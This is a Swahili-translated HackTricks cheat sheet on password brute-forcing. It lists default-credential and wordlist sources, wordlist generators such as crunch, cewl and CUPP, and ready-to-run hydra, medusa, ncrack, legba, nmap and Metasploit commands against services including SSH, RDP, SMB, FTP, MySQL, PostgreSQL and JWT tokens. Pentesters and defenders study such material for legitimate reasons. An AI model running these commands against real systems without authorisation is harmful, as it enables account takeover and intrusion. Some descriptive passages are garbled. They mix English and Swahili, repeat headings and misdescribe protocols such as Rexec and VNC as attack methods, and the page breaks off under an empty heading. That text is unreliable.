# Brute Force - Mwongozo wa Udanganyifu

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za **jamii ya juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udanganyifu kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Vitambulisho vya Kimsingi

**Tafuta kwenye google** vitambulisho vya msingi vya teknolojia inayotumiwa, au **jaribu viungo hivi**:

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/) 

## **Tengeneza Kamusi Zako**

Pata habari nyingi kuhusu lengo lako iwezekanavyo na tengeneza kamusi ya kipekee. Zana zinazoweza kusaidia:

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl ni zana inayotumiwa kwa ufanisi kwenye uchunguzi wa kijamii. Inachambua maandishi kwenye ukurasa wa wavuti na kutoa maneno muhimu kwa ajili ya mashambulizi ya nguvu. Unaweza kutumia maneno haya kama orodha ya uwezekano wa nywila au kama data ya kuingiza kwenye mashambulizi ya nguvu.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

Zalisha nywila kulingana na maarifa yako kuhusu muathiriwa (majina, tarehe...)
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Chombo cha kuzalisha orodha ya maneno, kinachokuwezesha kutoa seti ya maneno, ukiruhusu kutengeneza mabadiliko mengi kutoka kwa maneno yaliyotolewa, kujenga orodha ya maneno ya kipekee na bora kutumia kuhusiana na lengo maalum.
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### Orodha ya Maneno

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia mifumo ya kazi** kwa urahisi ikiwa na zana za jamii zilizo **za juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Huduma

Zimepangwa kwa herufi kwa utaratibu wa jina la huduma.

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) is a binary protocol that can be brute-forced using tools like Hydra or Burp Suite Intruder. It is used to communicate between a web server and a servlet container, and can be targeted for brute-force attacks to gain unauthorized access.
```bash
nmap --script ajp-brute -p 8009 <IP>
```
## AMQP (ActiveMQ, RabbitMQ, Qpid, JORAM and Solace)
```bash
legba amqp --target localhost:5672 --username admin --password data/passwords.txt [--amql-ssl]
```
### Cassandra

Cassandra ni mfumo wa usambazaji wa hifadhidata ambao unaweza kuhifadhi data kwenye seva nyingi. Kwa kawaida, kuna vikwazo vya kujaribu kuingia kwenye akaunti za mtumiaji kwa kutumia mchanganyiko wa majina ya mtumiaji na nywila. Kwa kutumia zana kama Hydra au Medusa, unaweza kufanya mashambulizi ya nguvu kwa kujaribu majina ya mtumiaji na nywila tofauti hadi upate upatikanaji. Kumbuka kwamba kufanya mashambulizi ya nguvu kwenye mifumo ambayo hauruhusiwi kufanya hivyo inaweza kuwa kinyume cha sheria.
```bash
nmap --script cassandra-brute -p 9160 <IP>
# legba ScyllaDB / Apache Casandra
legba scylla --username cassandra --password wordlists/passwords.txt --target localhost:9042
```
### CouchDB

### CouchDB

CouchDB is a database that can be brute-forced using a tool like `Hydra`. The default port for CouchDB is `5984`. To brute-force CouchDB, you can use a wordlist containing common passwords.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
### Elasticsearch

Elasticsearch ni injini ya utaftaji wa wazi inayotumika sana kwa kuhifadhi na kutafuta data. Inaweza kudhibitiwa kwa kutumia Brute Force kwa kutumia programu kama Hydra au Medusa. Kwa kufanya hivyo, unaweza kujaribu maneno muhimu au nywila kwa idadi kubwa ya majaribio hadi upate ufikiaji usio halali kwenye mfumo wa Elasticsearch.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP (File Transfer Protocol) ni itifaki inayotumiwa kusafirisha faili kutoka kwenye mtandao hadi kwenye kompyuta au kutoka kwenye kompyuta hadi kwenye mtandao.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
legba ftp --username admin --password wordlists/passwords.txt --target localhost:21
```
### Kukokotoa Kwa Nguvu ya Kawaida ya HTTP

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### Uthibitishaji wa Msingi wa HTTP
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
legba http.basic --username admin --password wordlists/passwords.txt --target http://localhost:8888/
```
### HTTP - NTLM

Brute force attacks against HTTP NTLM are typically carried out using tools like Hydra, Ncrack, Medusa, and others. These tools allow an attacker to automate the guessing of usernames and passwords against NTLM authentication. It is important to note that brute force attacks can be time-consuming and resource-intensive, so it is recommended to use them as a last resort and after other avenues of attack have been exhausted.
```bash
legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
```
### HTTP - Tuma Fomu
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
### **HTTP - CMS --** (W)ordpress, (J)oomla au (D)rupal au (M)oodle

Kwa http**s** unapaswa kubadilisha kutoka "http-post-form" hadi "**https-post-form"**
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
# Check also https://github.com/evilsocket/legba/wiki/HTTP
```
### IMAP

### IMAP
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
legba imap --username user --password data/passwords.txt --target localhost:993
```
### IRC

### IRC

IRC (Internet Relay Chat) is a popular communication protocol that enables real-time messaging and file sharing over the Internet. It is commonly used by hackers to communicate and collaborate with each other. IRC channels are often used to share hacking techniques, tools, and resources. Hackers can also use IRC for social engineering attacks, phishing, and spreading malware. It is important for cybersecurity professionals to monitor IRC channels to stay informed about the latest hacking trends and activities.
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

### ISCSI
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

### JWT
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP (Lightweight Directory Access Protocol) ni itifaki inayotumiwa kwa kawaida kwa uthibitishaji wa watumiaji. Kwa kawaida, mbinu ya nguvu ya kawaida inaweza kutumika kwa LDAP kwa kujaribu nywila zilizopendekezwa au orodha ya maneno.
```bash
nmap --script ldap-brute -p 389 <IP>
legba ldap --target 127.0.0.1:389 --username admin --password @wordlists/passwords.txt --ldap-domain example.org --single-match
```
### MQTT

#### Brute Force

Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method can be effective against MQTT servers that do not have proper security measures in place. Attackers can use automated tools to rapidly try different combinations, gaining unauthorized access to the server. It is important to use strong, unique passwords and implement other security measures to protect against brute force attacks. 

#### Dictionary Attack

A dictionary attack is similar to a brute force attack, but instead of trying all possible combinations, it uses a predefined list of commonly used passwords. This method is often more efficient than brute force as it targets the most likely passwords first. It is crucial to use complex and unique passwords to mitigate the risk of a successful dictionary attack.
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
legba mqtt --target 127.0.0.1:1883 --username admin --password wordlists/passwords.txt
```
### Mongo

#### Brute Force

Brute force attacks involve trying all possible combinations of a password until the correct one is found. This method can be used to gain unauthorized access to MongoDB databases by repeatedly trying different passwords until the correct one is discovered.

#### Prevention

To prevent brute force attacks on your MongoDB databases, you can implement the following measures:

1. **Strong Passwords**: Use complex and unique passwords that are difficult to guess.
2. **Account Lockout Policy**: Implement an account lockout policy that locks out an account after a certain number of failed login attempts.
3. **Rate Limiting**: Implement rate limiting to restrict the number of login attempts within a specific time frame.
4. **Multi-Factor Authentication (MFA)**: Enable MFA to add an extra layer of security to the authentication process.
5. **Monitoring and Logging**: Monitor and log login attempts to detect and respond to suspicious activity.

By implementing these preventive measures, you can enhance the security of your MongoDB databases and reduce the risk of unauthorized access through brute force attacks.
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
legba mongodb --target localhost:27017 --username root --password data/passwords.txt
```
### MSSQL

Brute-force attacks against MSSQL servers can be carried out using tools like Hydra, Ncrack, and Metasploit. These tools allow you to automate the process of trying different username and password combinations until the correct one is found. It is important to note that brute-forcing a MSSQL server is illegal unless you have explicit permission to do so as part of a penetration testing engagement.
```bash
legba mssql --username SA --password wordlists/passwords.txt --target localhost:1433
```
### MySQL

MySQL ni mfumo wa usimamizi wa database wa bure na wa chanzo wazi unaotumiwa sana. Kwa kawaida, mbinu ya kwanza ya kujaribu kuvunja usalama wa nenosiri la MySQL ni kwa kutumia mbinu ya nguvu ya brute. Hii inahusisha jaribio la kuingia kwa kutumia orodha ya maneno au tarakimu hadi kupata nywila sahihi. Kuna zana nyingi zinazopatikana kama Hydra au Medusa ambazo zinaweza kutumika kwa madhumuni haya.
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql

#Legba
legba mysql --username root --password wordlists/passwords.txt --target localhost:3306
```
### OracleSQL

#### Brute Force

Brute force ni mbinu ya msingi ya kujaribu kila chaguo linalowezekana kwa kutumia programu au script. Kwa OracleSQL, hii inaweza kutumika kujaribu kubaini nywila za mtumiaji kwa kujaribu kombinaysheni zote zinazowezekana za herufi na tarakimu. Kwa kawaida, mbinu hii inaweza kuwa polepole na inaweza kuzuiliwa na hatua za usalama kama vile kuzuia upatikanaji baada ya jaribio fulani.
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>

legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
```
Ili kutumia **oracle\_login** na **patator** unahitaji **kufunga**:
```bash
pip3 install cx_Oracle --upgrade
```
[Brute force ya hash ya OracleSQL nje ya mtandao](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**toleo 11.1.0.6, 11.1.0.7, 11.2.0.1, 11.2.0.2,** na **11.2.0.3**):
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

### POP

POP (Post Office Protocol) ni itifaki ya barua pepe inayotumiwa na watumiaji kuunganisha na seva ya barua pepe kusoma ujumbe wao. Kwa kawaida, POP hufanya kazi kwenye bandari ya 110. Wakati mwingine, unaweza kutumia mbinu ya kubadilisha nguvu kwa kujaribu maneno muhimu au nywila k kuingia kwenye akaunti ya barua pepe ya mtu mwingine.
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V

# Insecure
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:110

# SSL
legba pop3 --username admin@example.com --password wordlists/passwords.txt --target localhost:995 --pop3-ssl
```
### PostgreSQL

#### Brute Force

Brute force is a common technique used to gain unauthorized access to a system by trying all possible combinations of usernames and passwords until the correct one is found. This method can be used to attack PostgreSQL databases by repeatedly trying different login credentials until the attacker gains access.

#### Protection

To protect against brute force attacks on PostgreSQL databases, it is recommended to:

1. **Use Strong Passwords**: Ensure that strong, complex passwords are used for all database accounts.
2. **Limit Login Attempts**: Implement mechanisms to limit the number of login attempts allowed within a certain time frame.
3. **Enable Account Lockout**: Lock out user accounts after a certain number of failed login attempts to prevent further unauthorized access.
4. **Monitor Logs**: Regularly monitor database logs for any suspicious login activities and investigate them promptly.
5. **Implement Two-Factor Authentication**: Consider implementing two-factor authentication for an added layer of security.

By following these protection measures, you can significantly reduce the risk of unauthorized access to your PostgreSQL databases through brute force attacks.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
legba pgsql --username admin --password wordlists/passwords.txt --target localhost:5432
```
### PPTP

Unaweza kupakua pakiti ya `.deb` kufunga kutoka [https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

### RDP
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
legba rdp --target localhost:3389 --username admin --password data/passwords.txt [--rdp-domain <RDP_DOMAIN>] [--rdp-ntlm] [--rdp-admin-mode] [--rdp-auto-logon]
```
### Redis

Redis ni mfumo wa kuhifadhi data wa haraka sana unaotumika sana kwa kuhifadhi cache na kusimamia data inayobadilika mara kwa mara.
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
legba redis --target localhost:6379 --username admin --password data/passwords.txt [--redis-ssl]
```
### Rexec

Rexec ni mbinu ya kufanya mashambulizi ya nguvu kwa kujaribu maneno au nywila tofauti hadi kupata ile sahihi. Mbinu hii inaweza kutumika kuvunja ulinzi wa nywila na kuingia kwa lazima kwenye mfumo au akaunti.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin ni mbinu ya kuingilia mfumo kwa kutumia jaribio na makosa ya maneno ya siri.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh ni itifaki ya mbali inayotumika kwa kuingia kwa mbali kwenye mifumo ya Unix. Kwa sababu ya udhaifu wake wa usalama, Rsh haipaswi kutumiwa kwenye mazingira ya uzalishaji. Kwa kawaida, mbinu ya kwanza ya kufikia udhibiti wa mfumo wa Unix ni kujaribu kuingia kwa kutumia jina la mtumiaji na nywila kwa kutumia Rsh. Hii inaweza kufanywa kwa kutumia zana za kubadilisha nywila au kwa kujaribu nywila za kawaida.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

### Rsync

### Rsync

### Rsync
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

### RTSP

RTSP (Real Time Streaming Protocol) ni itifaki inayotumiwa kwa ajili ya uhamishaji wa data kwa njia ya mtandao.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SFTP

### SFTP
```bash
legba sftp --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba sftp --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
### SNMP

### SNMP
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

### SMB
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
legba smb --target share.company.com --username admin --password data/passwords.txt [--smb-workgroup <SMB_WORKGROUP>] [--smb-share <SMB_SHARE>]
```
### SMTP

### SMTP
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
legba smtp --username admin@example.com --password wordlists/passwords.txt --target localhost:25 [--smtp-mechanism <mech>]
```
### SOCKS

SOCKS ni itifaki ya mtandao inayotumiwa kwa kusudi la kusafirisha data kupitia firewall ya mtandao. Inaweza kutumika kama sehemu ya mbinu ya kuvunja nguvu kwa kusudi la kujaribu nywila kwa idadi kubwa ya majaribio.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt
# With alternative address
legba socks5 --target localhost:1080 --username admin --password data/passwords.txt --socks5-address 'internal.company.com' --socks5-port 8080
```
### SQL Server

### SQL Server

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### SSH

#### Brute Force

Brute force attacks involve trying all possible combinations of usernames and passwords until the correct one is found. This method is time-consuming but can be effective if the credentials are weak.

#### Dictionary Attack

A dictionary attack involves using a predefined list of words or phrases as potential passwords. This method is more efficient than brute force as it reduces the number of possible combinations to try.

#### SSH Brute Force Tools

There are several tools available for conducting SSH brute force attacks, such as Hydra, Medusa, and Ncrack. These tools automate the process of trying different username and password combinations to gain unauthorized access to SSH servers.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
legba ssh --username admin --password wordlists/passwords.txt --target localhost:22
# Try keys from a folder
legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --target localhost:22
```
#### Funguo dhaifu za SSH / Debian PRNG inayoweza kutabirika

Baadhi ya mifumo ina dosari inayojulikana katika mbegu ya nasibu inayotumika kuzalisha vifaa vya kryptografia. Hii inaweza kusababisha nafasi ndogo sana ya funguo ambayo inaweza kuvunjwa kwa kutumia zana kama [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Sets zilizotangulia kuzalishwa za funguo dhaifu pia zinapatikana kama [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### STOMP (ActiveMQ, RabbitMQ, HornetQ na OpenMQ)

Itifaki ya maandishi ya STOMP ni itifaki ya ujumbe inayotumiwa sana **kuruhusu mawasiliano laini na mwingiliano na huduma maarufu za foleni za ujumbe** kama RabbitMQ, ActiveMQ, HornetQ, na OpenMQ. Inatoa njia iliyostandardizwa na yenye ufanisi wa kubadilishana ujumbe na kutekeleza shughuli mbalimbali za ujumbe.
```bash
legba stomp --target localhost:61613 --username admin --password data/passwords.txt
```
### Telnet

Telnet ni itifaki ya mtandao inayotumiwa kwa mawasiliano ya maneno kati ya vifaa vya mtandao. Inaweza kutumika kama njia ya kufanya mashambulizi ya nguvu kwa kujaribu maneno ya siri kwa kuingia kwa nguvu kwenye mfumo.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet

legba telnet \
--username admin \
--password wordlists/passwords.txt \
--target localhost:23 \
--telnet-user-prompt "login: " \
--telnet-pass-prompt "Password: " \
--telnet-prompt ":~$ " \
--single-match # this option will stop the program when the first valid pair of credentials will be found, can be used with any plugin
```
### VNC

VNC, au Virtual Network Computing, ni njia ya kudhibiti kompyuta kijijini kupitia mtandao. Kwa kawaida, VNC hufanya kazi kwa kutumia brute force kwenye seva ya VNC ili kupata ufikiaji usioidhinishwa.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -p 5900,5901 --script vnc-brute --script-args brute.credfile=wordlist.txt <IP>
legba vnc --target localhost:5901 --password data/passwords.txt

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm ni itifaki ya usimamizi wa mbali inayotumiwa kwenye mifumo ya Windows. Inaweza kudukuliwa kwa kutumia mbinu ya nguvu ya kufikiria.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
<figure><img src="../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

\
Tumia [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kujenga na **kutumia workflows** kwa urahisi zinazotumia zana za jamii ya **juu zaidi** duniani.\
Pata Ufikiaji Leo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Mtaani

### Mitambo ya kuvunja mtandaoni

